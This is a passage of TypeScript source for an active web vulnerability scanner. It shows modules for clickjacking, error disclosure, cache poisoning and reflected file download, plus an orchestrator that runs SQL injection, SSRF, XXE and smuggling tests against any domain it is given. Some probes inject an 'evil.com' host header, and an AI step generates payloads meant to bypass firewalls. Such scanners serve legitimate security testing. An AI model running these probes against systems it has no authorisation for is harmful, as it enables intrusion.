            'Stack traces reveal internal application structure and potential vulnerabilities',
            'Use custom error pages; never expose stack traces in production',
            ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/']
          ));
          break;
        }

        // Database error disclosure
        if (bodyLower.includes('sql') && (bodyLower.includes('error') || bodyLower.includes('syntax') || bodyLower.includes('query'))) {
          findings.push(generateFinding(
            'Database Error Disclosure',
            'The application exposes database errors in responses.',
            Severity.HIGH,
            'Active Vulnerability',
            domain,
            `Trigger: ${trigger}, Response contains database error`,
            'Database errors reveal schema information and SQL syntax details',
            'Use generic error messages; log detailed errors server-side only',
            ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/']
          ));
          break;
        }
      } catch {}
    }
  } catch (e) { errors.push(`Error Handling: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Clickjacking ───
async function testClickjacking(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const res = await safeRequest(baseUrl, 'GET', {}, '');
    const xFrameOptions = (res.headers['x-frame-options'] || '').toString().toLowerCase();
    const csp = (res.headers['content-security-policy'] || '').toString().toLowerCase();
    const bodyLower = res.body.toLowerCase();

    // Check for frame-busting scripts (weak protection)
    const hasFrameBust = bodyLower.includes('top.location') || bodyLower.includes('parent.location') ||
      bodyLower.includes('window.top') || bodyLower.includes('self.frameElement');

    if (!xFrameOptions && !csp.includes('frame-ancestors') && !hasFrameBust) {
      findings.push(generateFinding(
        'Clickjacking (No Frame Protection)',
        'The application has no protection against clickjacking attacks.',
        Severity.MEDIUM,
        'Security Headers',
        domain,
        `X-Frame-Options: ${xFrameOptions || 'not set'}, CSP frame-ancestors: ${csp.includes('frame-ancestors') ? 'present' : 'not set'}`,
        'Without frame protection, attackers can embed the page in iframes for clickjacking',
        'Add X-Frame-Options: DENY or CSP frame-ancestors directive',
        ['https://owasp.org/www-community/attacks/Clickjacking']
      ));
    } else if (hasFrameBust && !xFrameOptions && !csp.includes('frame-ancestors')) {
      findings.push(generateFinding(
        'Weak Clickjacking Protection (Frame-Busting Only)',
        'The application relies on client-side frame-busting scripts, which can be bypassed.',
        Severity.LOW,
        'Security Headers',
        domain,
        'Frame-busting script detected but no X-Frame-Options or CSP frame-ancestors',
        'Frame-busting can be bypassed with sandbox iframe or other techniques',
        'Use X-Frame-Options or CSP frame-ancestors instead of frame-busting',
        ['https://owasp.org/www-community/attacks/Clickjacking']
      ));
    }
  } catch (e) { errors.push(`Clickjacking: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Web Cache Poisoning ───
async function testCachePoisoning(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    // Cache poisoning via unkeyed headers (X-Forwarded-Host, X-Forwarded-Proto)
    const poisonHeaders: { header: Record<string, string>; type: string }[] = [
      { header: { 'X-Forwarded-Host': 'evil.com' }, type: 'x-forwarded-host' },
      { header: { 'X-Forwarded-Proto': 'http' }, type: 'x-forwarded-proto' },
      { header: { 'X-Host': 'evil.com' }, type: 'x-host' },
      { header: { 'X-Real-IP': '127.0.0.1' }, type: 'x-real-ip' },
    ];

    for (const { header, type } of poisonHeaders) {
      try {
        const testUrl = `${baseUrl}/?cachebust=${type}-${Date.now()}`;
        const res = await safeRequest(testUrl, 'GET', header, '');

        // Check if the cache reflects attacker-controlled values
        const reflectsEvil = res.body.toLowerCase().includes('evil.com');
        if (reflectsEvil) {
          findings.push(generateFinding(
            `Cache Poisoning via ${type}`,
            `The application reflects the unkeyed header "${Object.keys(header)[0]}" in its response, allowing cache poisoning.`,
            Severity.CRITICAL,
            'Active Vulnerability',
            domain,
            `Header: ${Object.entries(header).map(([k, v]) => `${k}: ${v}`).join(', ')}, Reflected in response body`,
            'Cache poisoning delivers malicious content to all cached users, enabling XSS, phishing, and credential theft',
            'Never use unkeyed headers in cache keys; validate and whitelist header values; disable caching for dynamic content',
            ['https://portswigger.net/web-security/web-cache-poisoning']
          ));
          break;
        }
      } catch {}
    }
  } catch (e) { errors.push(`Cache Poisoning: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Reflected File Download (RFD) ───
async function testReflectedFileDownload(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const payloads = generateReflectedFileDownloadPayloads();
    const downloadParams = ['file', 'filename', 'download', 'q', 'url', 'href', 'link', 'src'];

    for (const param of downloadParams) {
      for (const { payload, indicator, type } of payloads) {
        try {
          const res = await safeRequest(`${baseUrl}?${param}=${encodeURIComponent(payload)}`, 'GET', {}, '');
          const ctype = (res.headers['content-type'] || '').toString();
          const cdisp = (res.headers['content-disposition'] || '').toString();

          // RFD occurs when the app reflects user input into a downloadable file
          if (ctype.includes('text/html') && (cdisp.includes('attachment') || cdisp.includes('filename'))) {
            findings.push(generateFinding(
              'Reflected File Download (RFD)',
              `The application reflects user input "${payload}" into a downloadable file, allowing RFD attacks.`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Parameter: ${param}, Type: ${type}, Content-Disposition: ${cdisp}, Content-Type: ${ctype}`,
              'RFD leads to tricking users into running malicious files, potentially leading to malware execution',
              'Never reflect user input into filenames; validate and sanitize; use fixed filenames for downloads',
              ['https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/reflected-file-download-a-new-web-attack-vector/']
            ));
            break;
          }
        } catch {}
      }
    }
  } catch (e) { errors.push(`RFD: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── Main Entry Point ───
export async function runActiveVulnScan(domain: string, _profile?: unknown): Promise<ScanResult> {
  const startTime = Date.now();
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    const baseUrl = `https://${domain}`;
    const httpUrl = `http://${domain}`;

    // Verify connectivity
    let connectivityOk = false;
    try { await makeRequest(baseUrl); connectivityOk = true; } catch {
      try { await makeRequest(httpUrl); connectivityOk = true; } catch {}
    }
    if (!connectivityOk) {
      errors.push(`Could not connect to ${domain}`);
      const duration = Date.now() - startTime;
      return { module: 'activeVuln', findings, duration, errors };
    }

    // Run all tests in parallel batches
    const batch1 = [
      testSSRF(domain, baseUrl, findings, errors),
      testXXE(domain, baseUrl, findings, errors),
      testNoSQL(domain, baseUrl, findings, errors),
      testSQLiPOST(domain, baseUrl, findings, errors),
      testSQLiBlind(domain, baseUrl, findings, errors),
    ];
    await Promise.allSettled(batch1);

    const batch2 = [
      testJWT(domain, baseUrl, findings, errors),
      testSmuggling(domain, baseUrl, findings, errors),
      testHostHeader(domain, baseUrl, findings, errors),
      testSSI(domain, baseUrl, findings, errors),
      testXSS(domain, baseUrl, findings, errors),
    ];
    await Promise.allSettled(batch2);

    const batch3 = [
      testOpenRedirect(domain, baseUrl, findings, errors),
      testPathTraversal(domain, baseUrl, findings, errors),
      testHeaderInjection(domain, baseUrl, findings, errors),
      testGraphQL(domain, baseUrl, findings, errors),
      testWebDAV(domain, baseUrl, findings, errors),
    ];
    await Promise.allSettled(batch3);

    const batch4 = [
      testAPISecurity(domain, baseUrl, findings, errors),
      testCORS(domain, baseUrl, findings, errors),
      testWAF(domain, baseUrl, findings, errors),
      testDirectoryEnum(domain, baseUrl, findings, errors),
      testCookieSecurity(domain, baseUrl, findings, errors),
    ];
    await Promise.allSettled(batch4);

    const batch5 = [
      testErrorHandling(domain, baseUrl, findings, errors),
      testClickjacking(domain, baseUrl, findings, errors),
      testCachePoisoning(domain, baseUrl, findings, errors),
      testReflectedFileDownload(domain, baseUrl, findings, errors),
    ];
await Promise.allSettled(batch5);

    // AI-enhanced vulnerability analysis - generate contextual payloads and enrich findings
    try {
      const ai = getAI();
      const techStack: string[] = []; // Could extract from technology findings
      // Generate contextual payloads for each vulnerability type found
      const vulnTypes = [...new Set(findings.map(f => f.category))];
      for (const vulnType of vulnTypes) {
        try {
          const payloads = await ai.generateContextualPayloads(`Active vulnerability testing on ${domain}`, vulnType);
          if (payloads.length > 0) {
            findings.push(generateFinding(
              `AI-Generated Payloads for ${vulnType}`,
              `AI generated ${payloads.length} contextual payloads for ${vulnType} testing: ${payloads.slice(0, 3).join(', ')}...`,
              Severity.INFO,
              'AI Payload Generation',
              domain,
              `Consider testing these AI-generated payloads: ${payloads.join(' | ')}`,
              'AI-generated payloads may bypass WAFs and find missed vulnerabilities',
              'Test AI-generated payloads against the target',
              [],
            ));
          }
        } catch {}
      }
      // Enrich top findings with AI analysis
      const highConfidenceFindings = findings.filter(f => f.severity === 'CRITICAL' || f.severity === 'HIGH').slice(0, 3);
      for (const f of highConfidenceFindings) {
        try {
          await ai.enrichFindingEvidence(f, `Target: ${domain}, Tech: ${techStack.join(', ')}`);
        } catch {}
      }
    } catch {}

    const duration = Date.now() - startTime;
    return { module: 'activeVuln', findings, duration, errors };
  } catch (error) {
    const duration = Date.now() - startTime;
    return {
      module: 'activeVuln',
      findings,
      duration,
      errors: [...errors, error instanceof Error ? error.message : String(error)],
    };
  }
}

